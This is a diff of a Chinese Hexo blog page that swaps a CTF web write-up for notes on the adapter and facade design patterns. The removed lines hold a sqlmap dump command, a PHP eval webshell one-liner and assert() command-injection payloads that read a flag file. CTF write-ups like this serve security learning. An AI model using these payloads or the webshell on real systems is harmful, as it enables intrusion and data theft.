@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://v25bh145.github.io">
-  <title>CTF笔记-WEB攻防-05 | V25bh145的小家儿~</title>
+  <title>7.适配器模式&amp;外观模式-设计模式 | V25bh145的小家儿~</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。  NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump">
-<meta name="keywords" content="ctf-web,CTF笔记-WEB攻防">
+  <meta name="description" content="适配器模式&amp;amp;外观模式 交流电适配器 =&amp;gt; “将一个接口转换成另一个接口，以符合客户的期望”   “如果它走起路来像只鸭子，叫起来像只鸭子，那么它必定可能是一只鸭子包装了鸭子适配器的火鸡”    客户使用适配器的过程   客户通过目标接口调用适配器的方法对适配器发出请求。 适配器使用被适配者接口把请求转换成被适配者的一个或多个接口。 客户接收到调用的结果，但并未察觉这一切是适配器在起转">
+<meta name="keywords" content="设计模式,《Head First 设计模式》">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF笔记-WEB攻防-05">
-<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;10&#x2F;14&#x2F;ctf&#x2F;ctf%E7%AC%94%E8%AE%B0-05&#x2F;index.html">
+<meta property="og:title" content="7.适配器模式&amp;外观模式-设计模式">
+<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;12&#x2F;15&#x2F;designPatten&#x2F;7.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F&amp;%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F&#x2F;index.html">
 <meta property="og:site_name" content="V25bh145的小家儿~">
-<meta property="og:description" content="此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。  NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump">
+<meta property="og:description" content="适配器模式&amp;amp;外观模式 交流电适配器 =&amp;gt; “将一个接口转换成另一个接口，以符合客户的期望”   “如果它走起路来像只鸭子，叫起来像只鸭子，那么它必定可能是一只鸭子包装了鸭子适配器的火鸡”    客户使用适配器的过程   客户通过目标接口调用适配器的方法对适配器发出请求。 适配器使用被适配者接口把请求转换成被适配者的一个或多个接口。 客户接收到调用的结果，但并未察觉这一切是适配器在起转">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2020-10-21T19:30:55.969Z">
+<meta property="og:updated_time" content="2020-12-15T03:40:42.653Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="V25bh145的小家儿~" type="application/atom+xml">
@@ -189,14 +189,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ctf/ctf笔记-05" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-designPatten/7.适配器模式&amp;外观模式-设计模式" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      CTF笔记-WEB攻防-05
+      7.适配器模式&amp;外观模式-设计模式
     </h1>
   
 
@@ -208,8 +208,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2020/10/14/ctf/ctf%E7%AC%94%E8%AE%B0-05/" class="archive-article-date">
-        <time datetime="2020-10-13T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-14</time>
+<a href="/2020/12/15/designPatten/7.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F&%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="archive-article-date">
+        <time datetime="2020-12-15T03:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-15</time>
 </a>
 
   
@@ -222,7 +222,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">500字</span>
+      <span class="post-count">848字</span>
     </span>
   </span>
 
@@ -231,7 +231,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">3分</span>
     </span>
   </span>
 </div>
@@ -242,42 +242,81 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <blockquote>
-<p>此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。</p>
+    <h2 id="适配器模式-amp-外观模式"><a href="#适配器模式-amp-外观模式" class="headerlink" title="适配器模式&amp;外观模式"></a>适配器模式&amp;外观模式</h2><blockquote>
+<p>交流电适配器 =&gt; “将一个接口转换成另一个接口，以符合客户的期望”</p>
 </blockquote>
-<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener">NewsCenter</a></h1><p>首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。</p>
-<p>接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。</p>
-<p>使用sqlmap，搞定。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump</span><br></pre></td></tr></table></figure>
-
+<blockquote>
+<p>“如果它走起路来像只鸭子，叫起来像只鸭子，那么它<del>必定</del>可能是一只<del>鸭子</del>包装了鸭子适配器的火鸡”</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>客户使用适配器的过程</p>
+</blockquote>
+<ol>
+<li>客户通过<strong>目标接口</strong>调用<strong>适配器的方法</strong>对<strong>适配器</strong>发出<strong>请求</strong>。</li>
+<li><strong>适配器</strong>使用<strong>被适配者接口</strong>把<strong>请求</strong>转换成被<strong>适配者的一个或多个接口</strong>。</li>
+<li>客户接收到调用的结果，但并未察觉这一切是适配器在起<strong>转换作用</strong>。</li>
+</ol>
+<ul>
+<li><strong>适配器</strong>要把<strong>被适配者</strong>转换成客户需要的样子。</li>
+<li><strong>客户</strong>与<strong>被适配者</strong>是解耦的。</li>
+</ul>
 <a id="more"></a>
 
-<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4822&page=1" target="_blank" rel="noopener">upload1</a></h1><p>看似为webshell上传，上传一个php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"awa"</span>]); <span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>定义</strong>: “<strong>适配器模式</strong>将一个<strong>类的接口</strong>，转换成<strong>客户期望的另一个接口</strong>，<strong>适配器</strong>让原本接口不兼容的类可以合作无间。”</p>
+</blockquote>
+<ul>
+<li>由类通过实现目标接口来包装被适配者。</li>
+<li>被适配者的子类也可以搭配适配器使用。</li>
+</ul>
+<blockquote>
+<p>适配不完全的例子-枚举器&amp;迭代器的适配器 =&gt; <strong>抛出异常</strong></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnumerationIterator</span> <span class="keyword">implements</span> <span class="title">Iterator</span> </span>&#123;</span><br><span class="line">    Enumeration <span class="keyword">enum</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EnumerationIterator</span><span class="params">(Enumeration <span class="keyword">enum</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="keyword">enum</span> = <span class="keyword">enum</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">enum</span>.hasMoreElements();</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">enum</span>.nextElement();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//枚举类中没有迭代器中remove()相对应的接口，因此只能抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。</p>
-<p>之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa)</p>
-<p>成功注入后即可随心所欲访问文件，当然flag也在里面。</p>
-<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002&page=1" target="_blank" rel="noopener">mfw</a></h1><p>首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。</p>
-<p>使用githacker进行攻击，githacker的具体食用方法见<code>ctf笔记-08</code>中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用)</p>
-<p>查看版本，确定只有一个版本之后，开始审计这个版本的代码。</p>
-<p>首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。</p>
-<p>开始审计index.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>需要想办法绕过两个’.’，</p>
-<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>这道题的漏洞出在assert()中，因为<strong><em>assert()可以执行字符串</em></strong>。</p>
-<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><ol>
-<li><pre><code class="payload">%27.system(&quot;cat%20./templates/flag.php&quot;).%27
-=&gt;
-&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;
-=&gt;
-file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;.php&apos;)
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```payload</span><br><span class="line">   %27)%20or%20phpinfo();%23   # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！</span><br><span class="line">   =&gt;</span><br><span class="line">   &apos;) or phpinfo();#&apos;</span><br><span class="line">   =&gt;</span><br><span class="line">   file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
+<blockquote>
+<p><a href="https://github.com/v25bh145/pattenDesign-code/tree/master/Turkey" target="_blank" rel="noopener">https://github.com/v25bh145/pattenDesign-code/tree/master/Turkey</a> 查看实例代码</p>
+</blockquote>
+<hr>
+<blockquote>
+<p><strong>定义</strong>: “<strong>外观模式</strong>提供了一个<strong>统一的接口</strong>，用来访问子系统中的<strong>一群接口</strong>。外观模式定义了一个<strong>高级接口</strong>，让子系统<strong>更容易使用</strong>。”</p>
+</blockquote>
+<ul>
+<li><strong>外观模式</strong>并没有封装子系统，而是提供了一个<strong>简化版的接口</strong>。  (命令模式则封装、统一了接口，提供了一个统一的、向外开放的命令接口)</li>
+<li><strong>外观模式</strong>将<strong>客户</strong>从<strong>组件的子系统</strong>中<strong>解耦</strong>。</li>
+<li><strong>外观模式</strong>的意图是<strong>简化接口</strong>，而<strong>适配器</strong>的意图是<strong>转换、改变接口</strong>。</li>
+<li>实现一个<strong>外观</strong>，需要将子系统<strong>组合</strong>(<strong>变量形式</strong>)进外观中，然后将工作<strong>委托</strong>(<strong>调用变量的方法或数据</strong>)给子系统执行。</li>
+</ul>
+<blockquote>
+<p>“<strong>最少知识原则</strong>(墨忒尔法则)” =&gt; “只和你的密友谈话”</p>
+</blockquote>
+<ul>
+<li>减少<strong>对象之间的交互</strong>，不要让太多类耦合在一起。</li>
+<li>方针: =&gt; 在任何对象的方法内，我们只应该调用属于以下范围的方法:<ol>
+<li>该对象本身</li>
+<li>被当作<strong>方法的参数</strong>传递而来的对象</li>
+<li>此方法所<strong>创建或实例化</strong>的任何对象</li>
+<li>对象的任何<strong>组件</strong> =&gt; 组件想象成实例对象所<strong>引用</strong>的对象，即是”HAS-A”关系</li>
 </ol>
-<p><del>flag在HTML的注释中</del></p>
+</li>
+<li>缺点: 会有很多<strong>包装类</strong>被制造出来，导致复杂度、开发时间增加与运行性能降低。</li>
+<li>错误用法举例:</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getTemp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//不要声明[传递/创建/实例化]的对象所[传递/创建/实例化]的对象</span></span><br><span class="line">    <span class="comment">//也就是说，避免二次引用，提倡一次饮用</span></span><br><span class="line">    Thermometer thermometer = station.getThermometer();</span><br><span class="line">    <span class="keyword">return</span> getTempHelper(thermometer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getTempHelper</span><span class="params">(Thermometer thermometer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> thermometer.getTemperature();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>正确用法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getTemp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//在之间使用station解耦</span></span><br><span class="line">    <span class="keyword">return</span> tation.getThermometer().getTemperature();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p><a href="https://github.com/v25bh145/pattenDesign-code/tree/master/HomeTheater" target="_blank" rel="noopener">https://github.com/v25bh145/pattenDesign-code/tree/master/HomeTheater</a> 查看实例代码</p>
+</blockquote>
 
     
 
@@ -292,7 +331,7 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://v25bh145.github.io/2020/10/14/ctf/ctf笔记-05/" title="CTF笔记-WEB攻防-05" target="_blank">https://v25bh145.github.io/2020/10/14/ctf/ctf笔记-05/</a>
+          <a href="https://v25bh145.github.io/2020/12/15/designPatten/7.适配器模式&外观模式-设计模式/" title="7.适配器模式&amp;外观模式-设计模式" target="_blank">https://v25bh145.github.io/2020/12/15/designPatten/7.适配器模式&外观模式-设计模式/</a>
         </li>
         
         <li>
@@ -314,11 +353,11 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">设计模式</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">《Head First 设计模式》</a>
         		</li>
       		
 		</ul>
@@ -337,18 +376,9 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
 
 <nav id="article-nav">
   
-    <a href="/2020/10/15/ctf/ctf%E7%AC%94%E8%AE%B0-06/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CTF笔记-WEB攻防-06
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/11/ctf/ctf%E7%AC%94%E8%AE%B0-04/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF笔记-WEB攻防-04</div>
+    <a href="/2020/12/13/designPatten/6.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">6.命令模式-设计模式</div>
       <i class="icon-circle-right"></i>
     </a>
   
